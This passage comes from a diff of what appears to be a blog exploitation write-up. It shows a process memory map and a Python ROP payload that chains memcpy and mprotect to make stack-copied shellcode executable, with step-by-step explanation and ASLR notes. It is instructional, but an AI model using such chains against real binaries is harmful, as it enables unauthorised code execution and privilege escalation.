+7ffff7fcd000-7ffff7fcf000 r-xp <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>                          <span style="color:#f92672">[</span>vdso<span style="color:#f92672">]</span>
+7ffff7fcf000-7ffff7fd0000 r--p <span style="color:#ae81ff">00000000</span> fd:01 <span style="color:#ae81ff">23857456</span>                   /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7ffff7fd0000-7ffff7ff3000 r-xp <span style="color:#ae81ff">00001000</span> fd:01 <span style="color:#ae81ff">23857456</span>                   /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7ffff7ff3000-7ffff7ffb000 r--p <span style="color:#ae81ff">00024000</span> fd:01 <span style="color:#ae81ff">23857456</span>                   /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7ffff7ffc000-7ffff7ffd000 r--p 0002c000 fd:01 <span style="color:#ae81ff">23857456</span>                   /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7ffff7ffd000-7ffff7ffe000 rw-p 0002d000 fd:01 <span style="color:#ae81ff">23857456</span>                   /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7ffff7ffe000-7ffff7fff000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span> 
+7ffffffde000-7ffffffff000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>                          <span style="color:#f92672">[</span>stack<span style="color:#f92672">]</span>
+ffffffffff600000-ffffffffff601000 --xp <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>                  <span style="color:#f92672">[</span>vsyscall<span style="color:#f92672">]</span>
+
+
+</code></pre></div><p>i am going to choose 0x7ffff7b44000 to 0x7ffff7b48000.</p>
+<p>This is how our payload is looking so far</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">520</span><span style="color:#f92672">-</span>len(shell))
+buf <span style="color:#f92672">+=</span> shell
+buf <span style="color:#f92672">+=</span> pop_rdi                    <span style="color:#75715e"># address of gadget pop rdi;ret</span>
+buf <span style="color:#f92672">+=</span> cpyDest                    <span style="color:#75715e"># Destination of where shellcode is going to be copied to</span>
+buf <span style="color:#f92672">+=</span> pop_rsi_pop_r15            <span style="color:#75715e"># have to sacrifice r15 register here to pop rsi</span>
+buf <span style="color:#f92672">+=</span> sourceAddr                 <span style="color:#75715e"># Location of payload on stack so memcpy knows where to start copying from</span>
+buf <span style="color:#f92672">+=</span> junk                       <span style="color:#75715e"># add junk to r15 register</span>
+buf <span style="color:#f92672">+=</span> pop_rdx  <span style="color:#f92672">&lt;------</span>
+buf <span style="color:#f92672">+=</span> sizeOfPayload              <span style="color:#75715e"># Amount of bytes to copy</span>
+buf <span style="color:#f92672">+=</span> memcpy                     <span style="color:#75715e"># Address of memcpy</span>
+buf <span style="color:#f92672">+=</span> pop_rdi
+buf <span style="color:#f92672">+=</span> cpyDest                    <span style="color:#75715e"># Address of new memory space to reassign permissions</span>
+buf <span style="color:#f92672">+=</span> pop_rdx  <span style="color:#f92672">&lt;------</span>
+buf <span style="color:#f92672">+=</span> perms                      <span style="color:#75715e"># permissions (rwx) to be set on memory</span>
+buf <span style="color:#f92672">+=</span> pop_rsi_pop_r15
+buf <span style="color:#f92672">+=</span> pagesize                   <span style="color:#75715e"># page size</span>
+buf <span style="color:#f92672">+=</span> junk                       <span style="color:#75715e"># add junk to r15 register</span>
+buf <span style="color:#f92672">+=</span> mprotect
+buf <span style="color:#f92672">+=</span> cpyDest
+</code></pre></div><p>We are writing our shellcode onto the stack, followed by our padding up to the ESP register. Next we pop the <code>rdi</code> register and put the destination of our new memory address into the register. After this, the source address (where the shellcode is on stack) and the size of the data to be copied is put into the respective <code>rsi</code> and <code>rdx</code> registers. Execution flow then points to the memcpy function which will be executed. Following from this, the destination of this new memory space provided earlier is put back into the <code>rdi</code> register, with the permissions and pagesize being place into the <code>rsi</code> and <code>rdx</code> registers respectively. Execution flow is then redirected to the mprotect function, changing the permissions of this area of memory to be <code>rwx</code>. To finish, the execution flow is redirected to the start of this new memory address which will execute our shellcode.</p>
+<p>To mitigate against ASLR we will copy the entire stack space leading up to the overwrite of the <code>rsp</code> register, including the nop sled. Thus, copying the nop sled and payload gives us more of a chance of code execution later when we provide the final address to return to. However, if we do not copy enough bytes, we might miss some of our shellcode, alternatively if we copy too many we could corrupt the payload and crash the binary.</p>
+<h1 id="privilege-escalation">Privilege escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
+<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
